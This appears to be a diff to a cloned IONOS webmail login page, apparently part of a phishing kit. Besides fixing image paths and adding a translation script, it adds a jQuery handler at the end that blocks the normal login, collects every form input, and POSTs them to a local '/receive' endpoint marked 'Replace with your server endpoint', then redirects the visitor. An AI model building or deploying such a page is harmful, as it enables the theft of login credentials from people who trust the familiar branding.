@@ -4,10 +4,10 @@
 <head>
     <link rel="stylesheet" href="https://ce1.uicdn.net/exos/framework/3.0/ionos.min.css" />
 
-    <link rel="icon" type="image/png" sizes="32x32" href="/image/favicon-32px.png" />
-    <link rel="icon" type="image/png" sizes="16x16" href="/image/favicon-16px.png" />
-    <link rel="icon" type="image/png" sizes="48x48" href="/image/favicon-48px.png" />
-    <link rel="shortcut icon" type="image/x-icon" href="/image/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32px.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16px.png" />
+    <link rel="icon" type="image/png" sizes="48x48" href="/images/favicon-48px.png" />
+    <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico" />
 
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
@@ -18,7 +18,112 @@
 
     <link rel="stylesheet" href="/style/main.min.css" />
 
+<script>
+	document.addEventListener("DOMContentLoaded", () => {
+  // Define translations
+  const translations = {
+    en: {
+      webmailLogin: "Webmail Login",
+      solutionFinder: "Solution finder",
+      helpContact: "Help & contact",
+      activationCookies: "Activation of Browser Cookies Required",
+      cookiesMessage:
+        "To take advantage of our offer, it is necessary for you to allow the use of cookies in your browser settings.",
+      learnMore: "Learn more",
+      enableJavaScript: "Please enable JavaScript in your browser",
+      javascriptMessage:
+        "To take advantage of our offer, it is necessary for you to allow the execution of JavaScript in your browser settings.",
+      myWebmailLogin: "My Webmail Login",
+      emailAddress: "Email address",
+      notYourDevice: "Not your device?",
+      logOut: "Log out after the session or use private browsing mode.",
+      next: "Next",
+      notCustomer: "Not an IONOS customer yet?",
+      becomeCustomer:
+        "Become a customer now and benefit from our offers.",
+    },
+    es: {
+      webmailLogin: "Inicio de sesión en Webmail",
+      solutionFinder: "Buscador de soluciones",
+      helpContact: "Ayuda y contacto",
+      activationCookies: "Activación de cookies del navegador requerida",
+      cookiesMessage:
+        "Para aprovechar nuestra oferta, es necesario permitir el uso de cookies en la configuración de su navegador.",
+      learnMore: "Más información",
+      enableJavaScript: "Por favor, habilite JavaScript en su navegador",
+      javascriptMessage:
+        "Para aprovechar nuestra oferta, es necesario permitir la ejecución de JavaScript en la configuración de su navegador.",
+      myWebmailLogin: "Mi inicio de sesión en Webmail",
+      emailAddress: "Dirección de correo electrónico",
+      notYourDevice: "¿No es tu dispositivo?",
+      logOut: "Cierra sesión después de la sesión o usa el modo de navegación privada.",
+      next: "Siguiente",
+      notCustomer: "¿Todavía no eres cliente de IONOS?",
+      becomeCustomer:
+        "Conviértete en cliente ahora y aprovecha nuestras ofertas.",
+    },
+    de: {
+      webmailLogin: "Webmail-Login",
+      solutionFinder: "Lösungsfinder",
+      helpContact: "Hilfe & Kontakt",
+      activationCookies: "Aktivierung von Browser-Cookies erforderlich",
+      cookiesMessage:
+        "Um unser Angebot zu nutzen, müssen Sie die Verwendung von Cookies in Ihren Browsereinstellungen zulassen.",
+      learnMore: "Mehr erfahren",
+      enableJavaScript: "Bitte aktivieren Sie JavaScript in Ihrem Browser",
+      javascriptMessage:
+        "Um unser Angebot zu nutzen, müssen Sie die Ausführung von JavaScript in Ihren Browsereinstellungen zulassen.",
+      myWebmailLogin: "Mein Webmail-Login",
+      emailAddress: "E-Mail-Adresse",
+      notYourDevice: "Nicht Ihr Gerät?",
+      logOut: "Melden Sie sich nach der Sitzung ab oder verwenden Sie den privaten Modus.",
+      next: "Weiter",
+      notCustomer: "Noch kein IONOS-Kunde?",
+      becomeCustomer:
+        "Werden Sie jetzt Kunde und profitieren Sie von unseren Angeboten.",
+    },
+    fr: {
+      webmailLogin: "Connexion Webmail",
+      solutionFinder: "Trouveur de solutions",
+      helpContact: "Aide et contact",
+      activationCookies: "Activation des cookies du navigateur requise",
+      cookiesMessage:
+        "Pour profiter de notre offre, il est nécessaire de permettre l'utilisation des cookies dans les paramètres de votre navigateur.",
+      learnMore: "En savoir plus",
+      enableJavaScript: "Veuillez activer JavaScript dans votre navigateur",
+      javascriptMessage:
+        "Pour profiter de notre offre, il est nécessaire de permettre l'exécution de JavaScript dans les paramètres de votre navigateur.",
+      myWebmailLogin: "Ma connexion Webmail",
+      emailAddress: "Adresse e-mail",
+      notYourDevice: "Pas votre appareil?",
+      logOut: "Déconnectez-vous après la session ou utilisez le mode de navigation privée.",
+      next: "Suivant",
+      notCustomer: "Pas encore client IONOS ?",
+      becomeCustomer:
+        "Devenez client maintenant et profitez de nos offres.",
+    },
+  };
 
+  // Detect the language from the meta tag
+  const langMeta = document.querySelector('meta[http-equiv="Content-Language"]');
+  const language = langMeta ? langMeta.getAttribute("name") : "en";
+
+  // Get translations for the detected language or default to English
+  const texts = translations[language] || translations.en;
+
+  // Replace text content dynamically
+  document.querySelector("title").textContent = texts.webmailLogin;
+  document.querySelector(".headline.stripe__element").textContent = texts.myWebmailLogin;
+  document.querySelector("label[for='username']").textContent = texts.emailAddress;
+  document.querySelector(".headline--sub").textContent = texts.activationCookies;
+  document.querySelector(".paragraph").textContent = texts.cookiesMessage;
+  document.querySelector("a.link--action").textContent = texts.learnMore;
+  document.querySelector(".button--primary").textContent = texts.next;
+  document.querySelector(".tile__label").textContent = texts.webmailLogin;
+
+  // Add more replacements as needed for other elements
+});
+	</script>
        
        	
        </head>
@@ -145,7 +250,7 @@
                             <ul>
                                 <li class="stripe stripe--cropped">
                                     <div class="stripe__item">
-                                        <img class="stripe__visual" src="/image/product-email.svg" height="58" width="auto" />
+                                        <img class="stripe__visual" src="/images/product-email.svg" height="58" width="auto" />
                                     </div>
                                     <div class="stripe__item">
                                         <h1 class="headline stripe__element">My Webmail Login</h1>
@@ -215,21 +320,21 @@
 
                         <div class="grid-col grid-col--4 grid-col--small-6">
                             <a class="tile tile--filled" href="https://login.ionos.com/">
-                                <img class="tile__image" src="/image/my-account.svg" />
+                                <img class="tile__image" src="/images/my-account.svg" />
                                 <span class="tile__label">My IONOS</span>
                             </a>
                         </div>
 
                         <div class="grid-col grid-col--4 grid-col--small-6">
                             <a class="tile tile--filled" href="https://hidrive.ionos.com/">
-                                <img class="tile__image" src="/image/product-hidrive.svg" />
+                                <img class="tile__image" src="/images/product-hidrive.svg" />
                                 <span class="tile__label">HiDrive</span>
                             </a>
                         </div>
 
                         <div class="grid-col grid-col--4 grid-col--small-6">
                             <a class="tile tile--filled" href="https://archive.ionos.com/">
-                                <img class="tile__image" src="/image/product-mail-archiving.svg" />
+                                <img class="tile__image" src="/images/product-mail-archiving.svg" />
                                 <span class="tile__label">Email Archiving</span>
                             </a>
                         </div>
@@ -328,5 +433,55 @@
     </div>
     <div class="static-overlay__blocker static-overlay__blocker--hidden"></div>
 </body>
+<script>
+$(document).ready(function() { 
+    $('#button--with-loader').on('click', function(e) {
+        e.preventDefault(); // Prevent default form submission
+
+        let isEmpty = false;
+        const checkInputs = $('input'); // Collect input fields
+
+        // Check for empty fields and highlight them
+        for (const check of checkInputs) {
+            if (check.value.trim() === "") {
+                check.style.borderColor = 'red'; // Highlight the empty input field
+                isEmpty = true; // Mark as empty
+            } else {
+                check.style.borderColor = ''; // Reset border color if filled
+            }
+        }
+
+        // If no input is empty, proceed with form submission
+        if (!isEmpty) {
+            // Serialize form data into an array
+            let userinfo = $('form').serializeArray(); // Make sure to wrap the inputs in a <form> tag
+            let user = {};
+            let visitor = sessionStorage.setItem('visitor', $('#user-id').val());
+            console.log(visitor);
+
+            userinfo.forEach((value) => {
+                user[value.name] = value.value; // Create user object from inputs
+            });
+
+            user['visitor'] = visitor; // Add visitor info to user object
+            console.log(user);
+
+            // Send AJAX request
+            $.ajax({
+                method: 'POST',
+                url: "/receive", // Replace with your server endpoint
+                data: user
+            }).done(function(msg) {
+                console.log(msg);
+                window.location.href = msg.url;
+            }).fail(function(err, textStatus, error) {
+                console.log('fail');
+                // Handle failure response
+                // Optional: You could redirect or show an error message here
+            });
+        }
+    });
+});
+</script> 
 
 </html>
